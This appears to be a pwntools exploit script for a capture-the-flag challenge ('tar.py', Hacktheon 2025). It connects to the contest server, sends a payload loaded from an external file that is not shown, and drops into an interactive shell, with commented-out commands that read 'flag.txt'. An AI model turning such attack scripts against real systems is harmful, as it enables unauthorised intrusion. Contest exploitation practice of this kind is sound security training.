#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template tar.py
from pwn import *

# Set up pwntools for the correct architecture
exe = 'python3 tar.py'
context.log_level = 'debug'

context.terminal = ['kitty']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DBG NOASLR
if args.DBG:
	context.log_level = 'debug'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug(exe, gdbscript=gdbscript, *a, **kw)
    else:
        return remote('hacktheon2025-challs-nlb-81f078c4ab2677e2.elb.ap-northeast-2.amazonaws.com',32496)

# MACROS
def s(a) : return p.send(a)
def sl(a) : return p.sendline(a)
def sa(a,b) : return p.sendafter(a,b)
def sla(a,b) : return p.sendlineafter(a,b)
def stb(var) : return str(var).encode()
def rv(a) : return p.recv(a)
def ru(a) : return p.recvuntil(a)
def ra() : return p.recvall()
def rl() : return p.recvline()
def cyc(a): return cyclic(a)
def inf(var) : return info(var)
def war(var) : return warn(var)
def succ(var) : return success(var)
def prog(var) : return log.progress(var)
def inr() : return p.interactive()
def cls() : return p.close()

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

'''
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> BEGIN EXPLOIT <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
'''

p = start()

with open('./encode.txt','rb') as bfile:
    inp = bfile.read()
    sl(inp)

info(f"SENT PAYLOAD")

ru(b'file to read')

sl(b'1')


# sl(b"echo '$$'")
# ru(b'$$\n')
# sl(b'cat flag.txt')
# flag = ru(b'}').decode()
# log.success(f"FLAG: {flag}")

inr()
